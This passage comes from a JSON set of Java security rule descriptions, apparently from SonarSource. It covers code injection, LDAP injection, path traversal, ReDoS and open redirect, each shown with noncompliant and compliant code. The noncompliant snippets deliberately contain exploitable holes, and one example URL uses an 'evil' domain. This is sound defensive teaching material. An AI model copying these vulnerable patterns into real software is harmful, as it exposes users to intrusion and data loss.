store the signing secret securely.</p>\n<h4>Pre-Approved classes</h4>\n<p>As a last resort, create a list of approved and safe classes that the application should be able to deserialize.<br> If the untrusted class does\nnot match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Note</strong>: Untrusted classes should be filtered out <strong>during</strong> deserialization, not after.<br> Depending on the language\nor framework, this should be possible by overriding the serialization process or using native capabilities to restrict type deserialization.</p>\n<p>In the previous example, the pre-approved list uses class names to validate the deserialized class.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/\">Top 10 2021 Category A8 - Software and Data Integrity\n  Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization\">Top 10 2017 Category A8 - Insecure\n  Deserialization</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/502\">CWE-502 - Deserialization of Untrusted Data</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S5334": {
        "name": "Dynamic code execution should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Code injections occur when applications allow the dynamic execution of code instructions from untrusted data.<br> An attacker can influence the\nbehavior of the targeted application and modify it to get access to sensitive data.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a dynamic code injection vulnerability will be able to execute arbitrary code in the context of the vulnerable\napplication.</p>\n<p>The impact depends on the access control measures taken on the target system OS. In the worst-case scenario, the process that executes the code\nruns with root privileges, and therefore any OS commands or programs may be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Denial of service and data leaks</h4>\n<p>In this scenario, the attack aims to disrupt the organization’s activities and profit from data leaks.</p>\n<p>An attacker could, for example:</p>\n<ul>\n  <li> download the internal server’s data, most likely to sell it </li>\n  <li> modify data, send malware </li>\n  <li> stop services or exhaust resources (with fork bombs for example) </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker also manages to elevate\ntheir privileges to an administrative level and attacks other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nby a combination of code injections and <strong>misconfiguration</strong> of:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Commons Compiler</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to arbitrary code execution because it compiles and runs HTTP data.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport org.codehaus.janino.ScriptEvaluator;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) throws IOException, InvocationTargetException {\n        ScriptEvaluator se = new ScriptEvaluator();\n        se.cook(\"System.out.println(\\\" + message \\\");\");\n        se.evaluate(null);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport org.codehaus.janino.ScriptEvaluator;\n\n@Controller\npublic class ExampleController\n{\n    @GetMapping(value = \"/\")\n    public void exec(@RequestParam(\"message\") String message) throws IOException, InvocationTargetException {\n        ScriptEvaluator se = new ScriptEvaluator();\n        se.setParameters(new String[] { \"input\" }, new Class[] { String.class });\n        se.cook(\"System.out.println(input);\");\n        se.evaluate(new Object[] { message });\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Allowing users to execute code dynamically generally creates more problems than it solves.</p>\n<p>Anything that can be done via dynamic code execution can usually be done via a language’s native SDK and static code.<br> Therefore, our suggestion\nis to avoid executing code dynamically.<br> If the application requires the execution of dynamic code, additional security measures must be taken.</p>\n<h4>Dynamic parameters</h4>\n<p>When the untrusted values are only expected to be values used in standard processing, it is generally possible to provide them as parameters of the\ndynamic code. In that case, care should be taken to ensure that only the <strong>name</strong> of the untrusted parameter is passed to the dynamic\ncode and not that its value is expanded into it. After that, the dynamic code will be able to safely access the untrusted parameter content and\nperform the processing.</p>\n<p>The compliant code example uses such an approach.</p>\n<h4>Allow list</h4>\n<p>When the untrusted parameters are expected to contain operators, function names or other reflection-related values, best practices would encourage\nusing an allow list. This one would contain a list of accepted safe values that can be used as part of the dynamic code.</p>\n<p>When receiving an untrusted parameter, the application would verify its value is contained in the configured allow list. If it is present, the\nparameter is accepted. Otherwise, it is rejected and an error is raised.</p>\n<p>Another similar approach is using a binding between identifiers and accepted values. That way, users are only allowed to provide identifiers, where\nonly valid ones can be converted to a safe value.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://blog.sonarsource.com/moodle-remote-code-execution/\">SonarSource, Evil Teacher: Code Injection in Moodle</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S6549": {
        "name": "Accessing files should not lead to filesystem oracle attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Applications behave as filesystem oracles when they disclose to attackers if resources from the filesystem exist or not.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initially intended path. The resulting\npath would resolve to a location somewhere in the filesystem which the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>An attacker exploiting a filesystem oracle vulnerability can determine if a file exists or not.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nelevated privileges, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Information gathering</h4>\n<p>The vulnerability is exploited to gather information about the host system. The filesystem oracle can help identify user accounts, running\nservices, or the exact version of installed software.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to a file system oracle as it allows testing the existence of a file anywhere on the file system.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.io.File;\n\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/exists\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        if (!file.exists()) { // Noncompliant\n            throw new IOException(\"File does not exists in the target directory\");\n        }\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.io.File;\n\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/exists\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        String canonicalDestinationPath = file.getCanonicalPath();\n\n        if (!canonicalDestinationPath.startsWith(targetDirectory)) {\n            throw new IOException(\"Entry is outside of the target directory\");\n        } else if (!file.exists()) {\n            throw new IOException(\"File does not exists in the target directory\");\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>The universal way to avoid filesystem oracle vulnerabilities is to validate paths constructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal (see the \"Pitfalls\" section). </li>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative paths or\n  path components like <code>../</code> and remove any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\n@GetMapping(value = \"/endpoint\")\npublic void endpoint(@RequestParam(\"folder\") fileName) throws IOException {\n\n    String canonicalizedFileName = fileName.getCanonicalPath();\n\n    if (!canonicalizedFileName.startsWith(targetDirectory)) {\n        throw new IOException(\"Entry is outside of the target directory\");\n    }\n}\n</pre>\n<p>This check can be bypassed if other directories start with <code>John</code>. For instance, <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code>\nreturns <code>true</code>. Thus, for validation, <code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h4>Do not use java.nio.file.Path.resolve as a validator</h4>\n<p>As specified in the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html\">official documentation</a>, if the given parameter\nis an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>\n<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "javasecurity:S2078": {
        "name": "LDAP queries should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>LDAP injections occur in an application when the application retrieves untrusted data and inserts it into an LDAP query without sanitizing it\nfirst.</p>\n<p>An LDAP injection can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s\nresponse.<br> The absence of the corresponding response for the malicious request on the application is not a barrier to exploitation. Thus, it must\nbe treated the same way as basic LDAP injections.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to LDAP injection: after discovering the injection point, attackers insert data into the vulnerable\nfield to execute malicious LDAP commands.</p>\n<p>The impact of this vulnerability depends on how vital LDAP servers are to the organization.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data leakage or corruption</h4>\n<p>In typical scenarios where systems perform innocuous LDAP operations to find users or create inventories, an LDAP injection could result in data\nleakage or corruption.</p>\n<h4>Privilege escalation</h4>\n<p>A malicious LDAP query could allow an attacker to impersonate a low-privileged user or an administrator in scenarios where systems perform\nauthorization checks or authentication.</p>\n<p>Attackers use this vulnerability to find multiple footholds on target organizations by gathering authentication bypasses.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to LDAP injections because untrusted data is concatenated to an LDAP query without prior sanitization\nor validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {\n  String user = req.getParameter(\"user\");\n  String pass = req.getParameter(\"pass\");\n\n  String filter = \"(&amp;(uid=\" + user + \")(userPassword=\" + pass + \"))\";\n\n  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(\"ou=system\", filter, new SearchControls());\n  return results.hasMore();\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic boolean authenticate(HttpServletRequest req, DirContext ctx) throws NamingException {\n  String user = req.getParameter(\"user\");\n  String pass = req.getParameter(\"pass\");\n\n  String filter = \"(&amp;(uid={0})(userPassword={1}))\";\n\n  NamingEnumeration&lt;SearchResult&gt; results = ctx.search(\"ou=system\", filter, new String[]{user, pass}, new SearchControls());\n  return results.hasMore();\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<p>For LDAP injection, the cleanest way to do so is to use parameterized queries if it is available for your use case.</p>\n<p>Another approach is to sanitize the input before using it in an LDAP query. Input sanitization should be primarily done using native libraries.</p>\n<p>Alternatively, validation can be implemented using an allowlist approach by creating a list of authorized and secure strings you want the\napplication to use in a query. If a user input does not match an entry in this list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must sanitize and validate on the server-side. Not on client-side front-ends.</p>\n<p>The most fundamental security mechanism is the restriction of LDAP metacharacters.</p>\n<p>For <strong>Distinguished Names</strong> (DN), special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>\\</code> </li>\n  <li> <code>#</code> </li>\n  <li> <code>+</code> </li>\n  <li> <code>&lt;</code> </li>\n  <li> <code>&gt;</code> </li>\n  <li> <code>,</code> </li>\n  <li> <code>;</code> </li>\n  <li> <code>\"</code> </li>\n  <li> <code>=</code> </li>\n</ul>\n<p>For <strong>Search Filters</strong>, special characters that need to be escaped include:</p>\n<ul>\n  <li> <code>*</code> </li>\n  <li> <code>(</code> </li>\n  <li> <code>)</code> </li>\n  <li> <code>\\</code> </li>\n  <li> <code>null</code> </li>\n</ul>\n<p>For Java, OWASP’s functions <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForDN-java.lang.String-\"><code>encodeForDN</code></a>\nand <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForLDAP-java.lang.String-\"><code>encodeForLDAP</code></a>\nallow sanitizing these characters and should be used: Remember that it is never a good practice to reinvent the wheel and write your own encoders.<br>\nHowever, if it is not possible to use these libraries, <a\nhref=\"https://github.com/bcgit/bc-java/blob/r1rv74/prov/src/main/java/org/bouncycastle/jce/provider/X509LDAPCertStoreSpi.java#L52-L70\">here</a> is an\nexample of an encoder implementation for LDAP search filters, in the <code>Bouncy Castle Java</code> framework.</p>\n<p>In the compliant solution example, the <code>search</code> function allows to safely parameterize the query.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4514.txt\">RFC 4514</a> - LDAP: String Representation of Distinguished Names </li>\n  <li> <a href=\"https://www.ietf.org/rfc/rfc4515.txt\">RFC 4515</a> - LDAP: String Representation of Search Filters </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/90\">CWE-90 - Improper Neutralization of Special Elements used in an LDAP Query ('LDAP\n  Injection')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S2083": {
        "name": "I/O function calls should not be vulnerable to path injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting\npath would resolve somewhere in the filesystem where the user should not normally have access to.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override or delete arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited\nto remove or corrupt files that are critical for the application or for the system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h4>Read arbitrary files</h4>\n<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to\nleak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>\n<p>An attacker can exploit the vulnerability in this code to delete arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n@Controller\npublic class ExampleController\n{\n    static private String targetDirectory = \"/path/to/target/directory/\";\n\n    @GetMapping(value = \"/delete\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetDirectory + filename);\n        file.delete();\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n@Controller\npublic class ExampleController\n{\n    private static String targetDirectory = \"/path/to/target/directory/\";\n    private static Path targetPath        = new File(targetDirectory).toPath().normalize();\n\n    @GetMapping(value = \"/delete\")\n    public void delete(@RequestParam(\"filename\") String filename) throws IOException {\n\n        File file = new File(targetPath + filename);\n\n        if (!file.toPath().normalize().startsWith(targetPath)) {\n            throw new IOException(\"Entry is outside of the target directory\");\n        }\n\n        file.delete();\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Canonical path validation</h4>\n<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths\nconstructed from untrusted data:</p>\n<ol>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>\n  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or\n  path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n</ol>\n<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by\ndesign:</p>\n<ol>\n  <li> <code>data = transform(user_input);</code> </li>\n  <li> <code>data = normalize(data);</code> </li>\n  <li> <code>data = sanitize(data);</code> </li>\n  <li> <code>use(data);</code> </li>\n</ol>\n<p>As pointed out in <a href=\"https://www.youtube.com/watch?v=V-DdcKADnFk\">this SonarSource talk</a>, failure to follow this exact order leads to\nsecurity vulnerabilities.</p>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\n@GetMapping(value = \"/endpoint\")\npublic void endpoint(@RequestParam(\"folder\") fileName) throws IOException {\n\n    String canonicalizedFileName = fileName.getCanonicalPath();\n\n    if (!canonicalizedFileName .startsWith(targetDirectory)) {\n        throw new IOException(\"Entry is outside of the target directory\");\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h4>Do not use java.nio.file.Path.resolve as a validator</h4>\n<p>As specified in the <a href=\"https://docs.oracle.com/javase/8/docs/api/java/nio/file/Path.html\">official documentation</a>, if the given parameter\nis an absolute path, the base object from which the method is called is discarded and is not included in the resulting string.</p>\n<p>This means that including untrusted data in the parameter and using the resulting string for file operations may lead to a path traversal\nvulnerability.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>\n<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this\ncan lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to make the affected component inaccessible.</p>\n<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Self Denial of Service</h4>\n<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)\ncan trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>\n<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>\n<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the\ndenial of service might only affect the attacker who initiated it.</p>\n<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems\nwould detect the failure of a container and automatically replace it.</p>\n<h4>Infrastructure SPOFs</h4>\n<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture\nvulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient\ncontainer creation capabilities or failures from containers to terminate).</p>\n<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge\noffensive infrastructures.</p>\n<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to Regex Denial of Service because untrusted data is used as a regex to scan a string without prior\nsanitization or validation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic boolean validate(HttpServletRequest request) {\n  String regex = request.getParameter(\"regex\");\n  String input = request.getParameter(\"input\");\n\n  return input.matches(regex);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic boolean validate(HttpServletRequest request) {\n  String regex = request.getParameter(\"regex\");\n  String input = request.getParameter(\"input\");\n\n  return input.matches(Pattern.quote(regex));\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Sanitization and Validation</h4>\n<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular\nexpression engine interprets these characters literally.</p>\n<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>\nIf a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>\n<p><strong>Important Note</strong>: The application must sanitize and validate on the server side. Not on client-side front end.</p>\n<p>Where possible, use <em>non-backtracking</em> regex engines, for example, Google’s <a href=\"https://github.com/google/re2\">re2</a>.</p>\n<p>In the example, <code>Pattern.quote</code> escapes metacharacters and escape sequences that could have broken the initially intended logic.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS\">OWASP Regular expression Denial of Service - ReDoS</a>\n  </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/400\">CWE-400 - Uncontrolled Resource Consumption</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1333\">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "javasecurity:S5146": {
        "name": "HTTP request redirections should not be open to forging attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Open redirection occurs when an application uses user-controllable data to redirect users to a URL.</p>\n<p>An attacker with malicious intent could manipulate a user to browse into a specially crafted URL, such as\n<code>https://trusted.example.com?url=evil.example.com</code>, to redirect the victim to his evil domain.</p>\n<p>Tricking users into sending the malicious HTTP request is usually the main task of exploiting an open redirection. Often, it requires an attacker\nto build a credible pretext to prevent suspicions from the victim.<br></p>\n<p>Attackers commonly use open redirect exploits in mass phishing campaigns.</p>\n<h3>What is the potential impact?</h3>\n<p>If an attacker tricks a user into opening a link of his choice, the user is redirected to a domain controlled by the attacker.</p>\n<p>From then on, the attacker can perform various malicious actions, some more impactful than others.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Domain Mirroring</h4>\n<p>A malicious link redirects to an attacker’s controlled website mirroring the interface of a web application trusted by the user. Due to the\nsimilarity in the application appearance and the apparently trustable clicked hyperlink, the user struggles to identify that they are browsing on a\nmalicious domain.<br></p>\n<p>Depending on the attacker’s purpose, the malicious website can leak credentials, bypass Multi-Factor Authentication (MFA), and reach any\nauthenticated data or action.</p>\n<h4>Malware Distribution</h4>\n<p>A malicious link redirects to an attacker’s controlled website that serves malware. On the same basis as the domain mirroring exploitation, the\nattacker develops a spearphishing or phishing campaign with a carefully crafted pretext that would result in the download and potential execution of a\nhosted malicious file.<br> The worst-case scenario could result in complete system compromise.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code example is vulnerable to open redirection as it constructs a URL with user-controllable data. This URL is then used\nto redirect the user without being first validated. An attacker can leverage this to manipulate users into performing unwanted redirects.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String location = req.getParameter(\"url\");\n  resp.sendRedirect(location);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprotected void doGet(HttpServletRequest req, HttpServletResponse resp) throws IOException {\n  String location = req.getParameter(\"url\");\n\n  List&lt;String&gt; allowedHosts = new ArrayList&lt;String&gt;();\n  allowedHosts.add(\"https://trusted1.example.com/\");\n  allowedHosts.add(\"https://trusted2.example.com/\");\n\n  if (allowedHosts.contains(location))\n    resp.sendRedirect(location);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>Built-in framework methods should be preferred as, more often than 